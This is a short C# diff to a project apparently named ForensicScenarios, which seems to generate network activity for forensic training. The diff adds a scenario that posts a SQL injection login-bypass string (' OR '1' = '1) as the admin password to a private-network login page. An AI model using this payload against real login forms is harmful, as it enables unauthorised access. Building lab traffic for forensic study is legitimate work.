@@ -4,6 +4,7 @@ using System.Windows;
 using System.Net.Http;
 using Caliburn.Micro;
 using ForensicScenarios.Events;
+using ForensicScenarios.ViewModels;
 
 namespace ForensicScenarios.Scenarios
 {
@@ -36,12 +37,16 @@ namespace ForensicScenarios.Scenarios
         {
             using (var client = new HttpClient())
             {
-                client.BaseAddress = new Uri("http://10.201.0.41/login");
+                var sqlInjection = "' OR '1' = '1";
+                var url = @"http://10.201.0.41/login/checklogin.php";
+                client.BaseAddress = new Uri(url);
+
                 var parameters = new Dictionary<string, string>();
                 parameters.Add("user", "admin");
-                parameters.Add("pass", "123456");
+                parameters.Add("pass", sqlInjection);
 
                 var content = new FormUrlEncodedContent(parameters);
+
                 try
                 {
                     var response = await client.PostAsync(client.BaseAddress.AbsolutePath, content);
